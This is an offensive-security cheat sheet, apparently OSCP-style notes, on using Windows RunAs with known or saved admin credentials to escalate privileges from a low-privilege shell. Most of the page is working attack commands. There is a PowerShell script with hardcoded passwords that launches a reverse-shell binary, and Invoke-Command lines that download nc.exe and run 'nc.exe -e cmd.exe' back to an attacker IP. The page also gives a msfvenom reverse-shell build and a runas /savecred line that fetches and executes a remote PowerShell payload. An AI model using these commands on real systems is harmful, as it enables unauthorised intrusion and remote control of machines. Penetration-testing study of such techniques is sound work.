# Runas

Windows includes a useful command called RunAs that enables a user to run a program as a different user if credentials are known.

## Example <a href="#example" id="example"></a>

***

So we have a program we want to run, we have a shell as a low priv user, and we have the username and password of an admin user from a different machine, but because we have a non-interactive shell there is no option to input the password. What can we do? Let me set up a situation and provide the solution for the problem:

&#x20;

### | create file <a href="#create-file" id="create-file"></a>

Create a file called runme.ps1 (powershell file), and add the contents below to the file:

```
$secpasswd = ConvertTo-SecureString "Welcome1!" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
$computer = "workstation7"
[System.Diagnostics.Process]::Start("C:\Users\alfred\Desktop\rev.exe","", $mycreds.Username, $mycreds.Password, $computer)
```

&#x20;

### | alternative to runme.ps1 <a href="#alternative-to-runmeps1" id="alternative-to-runmeps1"></a>

```
$password = convertto-securestring -AsPlainText -Force -String
"36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget
http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 4444} -credential $credential;
```

&#x20;

### | create reverse shell <a href="#create-reverse-shell" id="create-reverse-shell"></a>

```
msfvenom -p windows/shell_reverse_tcp LPORT=666 LHOST=10.10.14.6 -f exe -o rev.exe
```

&#x20;

### | execute <a href="#execute" id="execute"></a>

```
C:\> powershell -ExecutionPolicy Bypass -File runme.ps1
```

## RUNAS With saved keys <a href="#runas-with-saved-keys" id="runas-with-saved-keys"></a>

***

if you see keys with cmdkey /list , you can get a shell with those saved keys

```
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
```



#### Reference:

[https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/](https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/)
